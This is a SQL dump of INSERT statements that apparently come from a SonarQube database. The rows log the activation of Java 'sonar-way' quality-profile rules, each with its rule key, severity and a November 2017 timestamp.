INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (268, '2017-11-16 07:37:03.396', NULL, 'key=java-sonar-way-87983:squid:S2168;ruleKey=squid:S2168;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqkbbGRdfPp-qg6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (269, '2017-11-16 07:37:03.4', NULL, 'key=java-sonar-way-87983:squid:S2175;ruleKey=squid:S2175;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqobbGRdfPp-qg7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (270, '2017-11-16 07:37:03.405', NULL, 'key=java-sonar-way-87983:squid:S2176;ruleKey=squid:S2176;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqtbbGRdfPp-qg8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (271, '2017-11-16 07:37:03.41', NULL, 'key=java-sonar-way-87983:squid:S2177;ruleKey=squid:S2177;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnqybbGRdfPp-qg9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (272, '2017-11-16 07:37:03.416', NULL, 'key=java-sonar-way-87983:squid:S2178;ruleKey=squid:S2178;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnq4bbGRdfPp-qg-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (273, '2017-11-16 07:37:03.427', NULL, 'key=java-sonar-way-87983:squid:S2183;ruleKey=squid:S2183;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrDbbGRdfPp-qg_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (274, '2017-11-16 07:37:03.431', NULL, 'key=java-sonar-way-87983:squid:S2184;ruleKey=squid:S2184;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrHbbGRdfPp-qhA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (275, '2017-11-16 07:37:03.435', NULL, 'key=java-sonar-way-87983:squid:S2185;ruleKey=squid:S2185;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrLbbGRdfPp-qhB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (276, '2017-11-16 07:37:03.439', NULL, 'key=java-sonar-way-87983:squid:S2186;ruleKey=squid:S2186;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrPbbGRdfPp-qhC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (277, '2017-11-16 07:37:03.442', NULL, 'key=java-sonar-way-87983:squid:S2187;ruleKey=squid:S2187;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrSbbGRdfPp-qhD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (278, '2017-11-16 07:37:03.446', NULL, 'key=java-sonar-way-87983:squid:S2188;ruleKey=squid:S2188;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrWbbGRdfPp-qhE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (279, '2017-11-16 07:37:03.45', NULL, 'key=java-sonar-way-87983:squid:S2189;ruleKey=squid:S2189;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrabbGRdfPp-qhF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (280, '2017-11-16 07:37:03.454', NULL, 'key=java-sonar-way-87983:squid:S2200;ruleKey=squid:S2200;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrebbGRdfPp-qhG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (281, '2017-11-16 07:37:03.457', NULL, 'key=java-sonar-way-87983:squid:S2201;ruleKey=squid:S2201;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrhbbGRdfPp-qhH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (282, '2017-11-16 07:37:03.461', NULL, 'key=java-sonar-way-87983:squid:S2204;ruleKey=squid:S2204;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrlbbGRdfPp-qhI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (283, '2017-11-16 07:37:03.465', NULL, 'key=java-sonar-way-87983:squid:S2209;ruleKey=squid:S2209;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrpbbGRdfPp-qhJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (284, '2017-11-16 07:37:03.472', NULL, 'key=java-sonar-way-87983:squid:S2222;ruleKey=squid:S2222;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnrwbbGRdfPp-qhK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (285, '2017-11-16 07:37:03.48', NULL, 'key=java-sonar-way-87983:squid:S2225;ruleKey=squid:S2225;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnr4bbGRdfPp-qhL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (286, '2017-11-16 07:37:03.484', NULL, 'key=java-sonar-way-87983:squid:S2226;ruleKey=squid:S2226;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnr8bbGRdfPp-qhM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (287, '2017-11-16 07:37:03.488', NULL, 'key=java-sonar-way-87983:squid:S2230;ruleKey=squid:S2230;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsAbbGRdfPp-qhN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (288, '2017-11-16 07:37:03.492', NULL, 'key=java-sonar-way-87983:squid:S2232;ruleKey=squid:S2232;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsDbbGRdfPp-qhO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (289, '2017-11-16 07:37:03.495', NULL, 'key=java-sonar-way-87983:squid:S2235;ruleKey=squid:S2235;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsHbbGRdfPp-qhP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (290, '2017-11-16 07:37:03.499', NULL, 'key=java-sonar-way-87983:squid:S2236;ruleKey=squid:S2236;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsLbbGRdfPp-qhQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (291, '2017-11-16 07:37:03.503', NULL, 'key=java-sonar-way-87983:squid:S2251;ruleKey=squid:S2251;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsPbbGRdfPp-qhR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (292, '2017-11-16 07:37:03.507', NULL, 'key=java-sonar-way-87983:squid:S2252;ruleKey=squid:S2252;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsTbbGRdfPp-qhS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (293, '2017-11-16 07:37:03.51', NULL, 'key=java-sonar-way-87983:squid:S2254;ruleKey=squid:S2254;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsWbbGRdfPp-qhT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (294, '2017-11-16 07:37:03.514', NULL, 'key=java-sonar-way-87983:squid:S2259;ruleKey=squid:S2259;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsabbGRdfPp-qhU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (295, '2017-11-16 07:37:03.518', NULL, 'key=java-sonar-way-87983:squid:S2272;ruleKey=squid:S2272;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsebbGRdfPp-qhV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (296, '2017-11-16 07:37:03.522', NULL, 'key=java-sonar-way-87983:squid:S2273;ruleKey=squid:S2273;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsibbGRdfPp-qhW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (297, '2017-11-16 07:37:03.525', NULL, 'key=java-sonar-way-87983:squid:S2274;ruleKey=squid:S2274;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnslbbGRdfPp-qhX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (298, '2017-11-16 07:37:03.529', NULL, 'key=java-sonar-way-87983:squid:S2275;ruleKey=squid:S2275;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnspbbGRdfPp-qhY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (299, '2017-11-16 07:37:03.533', NULL, 'key=java-sonar-way-87983:squid:S2276;ruleKey=squid:S2276;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnstbbGRdfPp-qhZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (300, '2017-11-16 07:37:03.538', NULL, 'key=java-sonar-way-87983:squid:S2277;ruleKey=squid:S2277;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnsybbGRdfPp-qha');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (301, '2017-11-16 07:37:03.541', NULL, 'key=java-sonar-way-87983:squid:S2278;ruleKey=squid:S2278;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwns1bbGRdfPp-qhb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (302, '2017-11-16 07:37:03.545', NULL, 'key=java-sonar-way-87983:squid:S2293;ruleKey=squid:S2293;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwns5bbGRdfPp-qhc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (303, '2017-11-16 07:37:03.549', NULL, 'key=java-sonar-way-87983:squid:S2326;ruleKey=squid:S2326;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwns9bbGRdfPp-qhd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (304, '2017-11-16 07:37:03.552', NULL, 'key=java-sonar-way-87983:squid:S2386;ruleKey=squid:S2386;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntAbbGRdfPp-qhe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (305, '2017-11-16 07:37:03.558', NULL, 'key=java-sonar-way-87983:squid:S2387;ruleKey=squid:S2387;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntGbbGRdfPp-qhf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (306, '2017-11-16 07:37:03.562', NULL, 'key=java-sonar-way-87983:squid:S2388;ruleKey=squid:S2388;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntKbbGRdfPp-qhg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (307, '2017-11-16 07:37:03.566', NULL, 'key=java-sonar-way-87983:squid:S2390;ruleKey=squid:S2390;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntNbbGRdfPp-qhh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (308, '2017-11-16 07:37:03.569', NULL, 'key=java-sonar-way-87983:squid:S2391;ruleKey=squid:S2391;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntRbbGRdfPp-qhi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (309, '2017-11-16 07:37:03.578', NULL, 'key=java-sonar-way-87983:squid:S2437;ruleKey=squid:S2437;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntabbGRdfPp-qhj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (310, '2017-11-16 07:37:03.582', NULL, 'key=java-sonar-way-87983:squid:S2438;ruleKey=squid:S2438;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntdbbGRdfPp-qhk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (311, '2017-11-16 07:37:03.585', NULL, 'key=java-sonar-way-87983:squid:S2440;ruleKey=squid:S2440;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnthbbGRdfPp-qhl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (312, '2017-11-16 07:37:03.589', NULL, 'key=java-sonar-way-87983:squid:S2441;ruleKey=squid:S2441;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntlbbGRdfPp-qhm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (313, '2017-11-16 07:37:03.592', NULL, 'key=java-sonar-way-87983:squid:S2442;ruleKey=squid:S2442;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntobbGRdfPp-qhn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (314, '2017-11-16 07:37:03.596', NULL, 'key=java-sonar-way-87983:squid:S2445;ruleKey=squid:S2445;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntsbbGRdfPp-qho');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (315, '2017-11-16 07:37:03.602', NULL, 'key=java-sonar-way-87983:squid:S2446;ruleKey=squid:S2446;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwntybbGRdfPp-qhp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (316, '2017-11-16 07:37:03.605', NULL, 'key=java-sonar-way-87983:squid:S2447;ruleKey=squid:S2447;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnt1bbGRdfPp-qhq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (317, '2017-11-16 07:37:03.609', NULL, 'key=java-sonar-way-87983:squid:S2583;ruleKey=squid:S2583;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnt5bbGRdfPp-qhr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (318, '2017-11-16 07:37:03.619', NULL, 'key=java-sonar-way-87983:squid:S2589;ruleKey=squid:S2589;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuDbbGRdfPp-qhs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (319, '2017-11-16 07:37:03.623', NULL, 'key=java-sonar-way-87983:squid:S2629;ruleKey=squid:S2629;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuHbbGRdfPp-qht');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (320, '2017-11-16 07:37:03.627', NULL, 'key=java-sonar-way-87983:squid:S2637;ruleKey=squid:S2637;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuLbbGRdfPp-qhu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (321, '2017-11-16 07:37:03.63', NULL, 'key=java-sonar-way-87983:squid:S2638;ruleKey=squid:S2638;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuObbGRdfPp-qhv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (322, '2017-11-16 07:37:03.634', NULL, 'key=java-sonar-way-87983:squid:S2639;ruleKey=squid:S2639;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuSbbGRdfPp-qhw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (323, '2017-11-16 07:37:03.637', NULL, 'key=java-sonar-way-87983:squid:S2653;ruleKey=squid:S2653;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuVbbGRdfPp-qhx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (324, '2017-11-16 07:37:03.641', NULL, 'key=java-sonar-way-87983:squid:S2674;ruleKey=squid:S2674;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuZbbGRdfPp-qhy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (325, '2017-11-16 07:37:03.644', NULL, 'key=java-sonar-way-87983:squid:S2675;ruleKey=squid:S2675;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnucbbGRdfPp-qhz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (326, '2017-11-16 07:37:03.647', NULL, 'key=java-sonar-way-87983:squid:S2676;ruleKey=squid:S2676;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnufbbGRdfPp-qh0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (327, '2017-11-16 07:37:03.651', NULL, 'key=java-sonar-way-87983:squid:S2677;ruleKey=squid:S2677;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnujbbGRdfPp-qh1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (328, '2017-11-16 07:37:03.655', NULL, 'key=java-sonar-way-87983:squid:S2681;ruleKey=squid:S2681;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnunbbGRdfPp-qh2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (329, '2017-11-16 07:37:03.659', NULL, 'key=java-sonar-way-87983:squid:S2692;ruleKey=squid:S2692;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnurbbGRdfPp-qh3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (330, '2017-11-16 07:37:03.663', NULL, 'key=java-sonar-way-87983:squid:S2695;ruleKey=squid:S2695;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuvbbGRdfPp-qh4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (331, '2017-11-16 07:37:03.667', NULL, 'key=java-sonar-way-87983:squid:S2696;ruleKey=squid:S2696;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnuzbbGRdfPp-qh5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (332, '2017-11-16 07:37:03.674', NULL, 'key=java-sonar-way-87983:squid:S2718;ruleKey=squid:S2718;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnu6bbGRdfPp-qh6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (333, '2017-11-16 07:37:03.677', NULL, 'key=java-sonar-way-87983:squid:S2737;ruleKey=squid:S2737;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnu9bbGRdfPp-qh7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (334, '2017-11-16 07:37:03.681', NULL, 'key=java-sonar-way-87983:squid:S2757;ruleKey=squid:S2757;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvBbbGRdfPp-qh8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (335, '2017-11-16 07:37:03.684', NULL, 'key=java-sonar-way-87983:squid:S2786;ruleKey=squid:S2786;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvEbbGRdfPp-qh9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (336, '2017-11-16 07:37:03.688', NULL, 'key=java-sonar-way-87983:squid:S2789;ruleKey=squid:S2789;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvIbbGRdfPp-qh-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (337, '2017-11-16 07:37:03.694', NULL, 'key=java-sonar-way-87983:squid:S2864;ruleKey=squid:S2864;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvObbGRdfPp-qh_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (338, '2017-11-16 07:37:03.698', NULL, 'key=java-sonar-way-87983:squid:S2885;ruleKey=squid:S2885;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvSbbGRdfPp-qiA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (339, '2017-11-16 07:37:03.702', NULL, 'key=java-sonar-way-87983:squid:S2886;ruleKey=squid:S2886;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvWbbGRdfPp-qiB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (340, '2017-11-16 07:37:03.706', NULL, 'key=java-sonar-way-87983:squid:S2912;ruleKey=squid:S2912;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvabbGRdfPp-qiC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (341, '2017-11-16 07:37:03.71', NULL, 'key=java-sonar-way-87983:squid:S2924;ruleKey=squid:S2924;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvdbbGRdfPp-qiD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (342, '2017-11-16 07:37:03.713', NULL, 'key=java-sonar-way-87983:squid:S2925;ruleKey=squid:S2925;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvhbbGRdfPp-qiE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (343, '2017-11-16 07:37:03.717', NULL, 'key=java-sonar-way-87983:squid:S2970;ruleKey=squid:S2970;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvlbbGRdfPp-qiF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (344, '2017-11-16 07:37:03.721', NULL, 'key=java-sonar-way-87983:squid:S2975;ruleKey=squid:S2975;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvpbbGRdfPp-qiG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (345, '2017-11-16 07:37:03.725', NULL, 'key=java-sonar-way-87983:squid:S2976;ruleKey=squid:S2976;profileKey=java-sonar-way-87983;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnvtbbGRdfPp-qiH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (346, '2017-11-16 07:37:03.735', NULL, 'key=java-sonar-way-87983:squid:S3008;ruleKey=squid:S3008;profileKey=java-sonar-way-87983;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnv3bbGRdfPp-qiI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (347, '2017-11-16 07:37:03.739', NULL, 'key=java-sonar-way-87983:squid:S3010;ruleKey=squid:S3010;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnv7bbGRdfPp-qiJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (348, '2017-11-16 07:37:03.742', NULL, 'key=java-sonar-way-87983:squid:S3020;ruleKey=squid:S3020;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwnv-bbGRdfPp-qiK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (349, '2017-11-16 07:37:03.747', NULL, 'key=java-sonar-way-87983:squid:S3027;ruleKey=squid:S3027;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwDbbGRdfPp-qiL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (350, '2017-11-16 07:37:03.751', NULL, 'key=java-sonar-way-87983:squid:S3034;ruleKey=squid:S3034;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwHbbGRdfPp-qiM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (351, '2017-11-16 07:37:03.754', NULL, 'key=java-sonar-way-87983:squid:S3038;ruleKey=squid:S3038;profileKey=java-sonar-way-87983;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwKbbGRdfPp-qiN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (352, '2017-11-16 07:37:03.758', NULL, 'key=java-sonar-way-87983:squid:S3042;ruleKey=squid:S3042;profileKey=java-sonar-way-87983;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwObbGRdfPp-qiO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (353, '2017-11-16 07:37:03.762', NULL, 'key=java-sonar-way-87983:squid:S3046;ruleKey=squid:S3046;profileKey=java-sonar-way-87983;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DwnwSbbGRdfPp-qiP');
